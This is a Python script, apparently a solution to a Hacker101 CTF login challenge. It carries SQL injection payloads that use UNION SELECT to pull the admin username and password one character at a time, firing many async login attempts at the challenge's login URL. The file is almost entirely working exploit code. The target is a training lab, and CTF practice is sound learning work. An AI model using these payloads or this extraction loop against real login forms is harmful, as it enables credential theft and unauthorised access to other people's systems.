#! /usr/bin/python3.8
import asyncio
import logging
from aiohttp import ClientSession
from typing import Iterable, List, NoReturn, Tuple, Union
from sys import argv, exit

# Setup logger
logging.basicConfig(format="[%(asctime)s][%(levelname)s][%(name)s]%(message)s",
    level=logging.DEBUG)
logger = logging.getLogger("main")
logger.setLevel(logging.INFO)

# Setup implicit loggers level
for l in [
        "asyncio",
        "urllib3.connectionpool"
    ]:
    logging.getLogger(l).setLevel(logging.ERROR)

# Convert :idx integer char into password
SQLI_CHAR = "' union select ascii(substring(:field, :idx, 1)) as password" \
    + " from admins limit 1; --"
# Convert :field length into password
SQLI_LENGTH = "' union select length(:field) as password" \
    + " from admins limit 1; --"
CFT_URL = "https://{}.ctf.hacker101.com/login"
HEADERS = {
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8"
        }

def error(msg: str) -> NoReturn:
    '''Prints error message and terminate execution.'''
    print(f"[Error] {msg}")
    exit(1)

async def send_injection(session: ClientSession, payload: str,
        s: str, idx: int = 0) -> Tuple[bool, str, int]:
    '''Test s against sql injection at paypload.

    Returns: A tuple with True is result match with payload, False otherwise.
    And s.
    '''
    global CFT_URL, logger

    match_found: bool = False
    data: dict[str, str] = { "username": payload, "password": s }

    logger.debug(f"Sending injection: {data}")

    try:
        async with session.post(CFT_URL, data=data) as r:
            match_found = r.status == 200 and \
                "Logged in" in await r.text()
    # Task was cancelled
    except asyncio.CancelledError:
        logger.debug("Cancelled task!")
    # Something else happens
    except Exception as e:
        logger.error(e)

    return match_found, s, idx

async def determine_field_length(field: str, max_length) -> int:
    '''Determines field's length or returns 0.

    Returns: integer > 1 when length is found and 0 otherwise.'''
    global HEADERS, logger, SQLI_LENGTH

    calls: List[asyncio.Task[Tuple[bool, str, int]]] = []
    payload: str = SQLI_LENGTH.replace(":field", field)
    logger.info(f"Payload: {payload}")
    logger.info(f"Determining {field}'s length...")

    async with ClientSession(headers=HEADERS) as session:
        # Create tasks
        for i in range(1, max_length):
            calls.append(
                    asyncio.create_task(
                        send_injection(session, payload, str(i), i)
                    )
                )

        # Check results
        field_length: int = 0
        for task in asyncio.as_completed(calls):
            is_match, length, idx = await task

            # Result is done
            if is_match:
                field_length = int(length)
                break

        # Stop all tasks
        if field_length > 0:
            for task in calls:
                task.cancel()

    return field_length

async def guess_field(field: str, length: int,
        chars_range: Iterable = range(33, 126)) -> str:
    '''Try to guess field content.

    Length must be determined using determine_field_lenth function.
    chars_range created using range built-in from 33 (utf-8 non printable chars
    must be avoided). The range 33~126 is usually fine.
    Returns: The field content
    '''
    global HEADERS, logger, SQLI_CHAR
    logger.info(f"Guessing field content {field}...")
    guessed_field_name: Union[List[Tuple[int, str]], str] = []

    payload: str = SQLI_CHAR.replace(":field", field)
    # Loops chars
    for i in range(1, length+1):
        async with ClientSession(headers=HEADERS) as session:
            logger.info(f"Testing {i} char...")
            _payload: str = payload.replace(":idx", str(i))
            calls: List[asyncio.Task] = []

            # Create task for every char at chars_range
            for ic in chars_range:
                calls.append(
                        asyncio.create_task(
                            send_injection(session, _payload, ic, i)
                        )
                    )

            # Checks results
            cancel_tasks: bool = False
            for task in asyncio.as_completed(calls):
                is_match, ic, idx = await task

                # Result is done
                if is_match:
                    guessed_field_name.append((idx, chr(ic)))
                    cancel_tasks = True
                    break

            # Stop all tasks
            if cancel_tasks:
                for task in calls:
                    task.cancel()

    # Sort and join field name
    guessed_field_name.sort()
    guessed_field_name = "".join([t[1] for t in guessed_field_name])

    return guessed_field_name

async def main() -> None:
    global CFT_URL, logger

    if len(argv) == 1:
        error("cft id parameter not given!")

    cft_id = argv[1]

    if len(cft_id) < 32:
        error("cft id parameter is wrong!")

    CFT_URL = CFT_URL.format(cft_id)

    # Sets debug level
    if "--debug" in argv:
        logger.setLevel(logging.DEBUG)

    # Try to determines username's length
    username_length: int = await determine_field_length("username", 20)
    logger.info(f"username's length: {username_length}")

    # Try to determines password's length
    password_length: int = await determine_field_length("password", 40)
    logger.info(f"password's length: {password_length}")

    username: str = await guess_field("username", username_length)
    logger.info(f"username: {username}")

    password: str = await guess_field("password", password_length)
    logger.info(f"password: {password}")

if __name__ == "__main__":
    asyncio.run(main())